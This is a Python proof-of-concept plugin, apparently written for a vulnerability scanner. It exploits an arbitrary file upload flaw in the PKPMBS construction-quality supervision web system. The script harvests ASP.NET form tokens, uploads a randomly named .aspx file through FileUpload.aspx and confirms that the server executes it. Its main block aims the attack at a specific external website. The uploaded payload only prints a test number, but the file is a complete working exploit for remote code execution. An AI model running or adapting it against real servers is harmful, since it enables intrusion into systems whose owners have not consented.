#!/usr/bin/evn python
#--coding:utf-8--*--
# Name:建设工程质量监督系统任意文件上传
# Refer:http://www.wooyun.org/bugs/wooyun-2010-0119750
# Author:xq17
import re
import random

def get__EVENTVALIDATION(arg):
    url = arg + 'PKPMBS/common/upload/FileUpload.aspx'
    code, head, res, errcode, _ = curl.curl2(url)
    try:
        __EVENTVALIDATION = re.findall(
            'id="__EVENTVALIDATION" value="(.*?)"', res)[0]
    except:
        return
    return __EVENTVALIDATION


def get__VIEWSTATE(arg):
    url = arg + 'PKPMBS/common/upload/FileUpload.aspx'
    code, head, res, errcode, _ = curl.curl2(url)
    try:
        __VIEWSTATE = re.findall('id="__VIEWSTATE" value="(.*?)"', res)[0]
    except:
        return
    return __VIEWSTATE


def getpath(arg):
    url = arg + 'PKPMBS/common/upload/FileUpload.aspx'
    code, head, res, errcode, _ = curl.curl2(url)
    try:
        path = re.findall('id="savePath" value="(.*?)"', res)[0]
    except:
        return
    return path


def getraw(arg, path, __VIEWSTATE, __EVENTVALIDATION, filename):
    raw = """POST /PKPMBS/common//upload/FileUpload.aspx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: {arg}/PKPMBS/common//upload/FileUpload.aspx
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------270813688196
Content-Length: 1642

-----------------------------270813688196
Content-Disposition: form-data; name="__EVENTTARGET"

savebtn
-----------------------------270813688196
Content-Disposition: form-data; name="__EVENTARGUMENT"


-----------------------------270813688196
Content-Disposition: form-data; name="__VIEWSTATE"

{__VIEWSTATE}
-----------------------------270813688196
Content-Disposition: form-data; name="__EVENTVALIDATION"

{__EVENTVALIDATION}
-----------------------------270813688196
Content-Disposition: form-data; name="id"


-----------------------------270813688196
Content-Disposition: form-data; name="textValue"


-----------------------------270813688196
Content-Disposition: form-data; name="savePath"

{path}
-----------------------------270813688196
Content-Disposition: form-data; name="action"


-----------------------------270813688196
Content-Disposition: form-data; name="isInit"

1
-----------------------------270813688196
Content-Disposition: form-data; name="RealPath"


-----------------------------270813688196
Content-Disposition: form-data; name="Type"

0
-----------------------------270813688196
Content-Disposition: form-data; name="fileMemo"


-----------------------------270813688196
Content-Disposition: form-data; name="file"; filename="{filename}"
Content-Type: application/octet-stream

<% Response.Write(1000+1);%>
-----------------------------270813688196--
""".format(arg=arg, path=path, __VIEWSTATE=__VIEWSTATE, __EVENTVALIDATION=__EVENTVALIDATION, filename=filename)
    return raw


def assign(service, arg):
    if service == "pkpmbs":
        return True, arg


def audit(arg):
    filename = 'bug_'+str(random.randrange(1111, 9999))+'.aspx'
    path = getpath(arg)
    __VIEWSTATE = get__VIEWSTATE(arg)
    __EVENTVALIDATION = get__EVENTVALIDATION(arg)
    raw = getraw(arg, path, __VIEWSTATE, __EVENTVALIDATION, filename)
    url = arg + 'PKPMBS/common/upload/FileUpload.aspx'
    code, head, res, errcode, _ = curl.curl2(
        url, raw=raw)
    url = arg + \
        r'/pkpmbs/UserFiles/%E9%99%84%E4%BB%B6(%E5%8B%BF%E5%88%A0)/'+filename
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and '1001' in res:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('pkpmbs', 'http://www.ccjdw.com/')[1])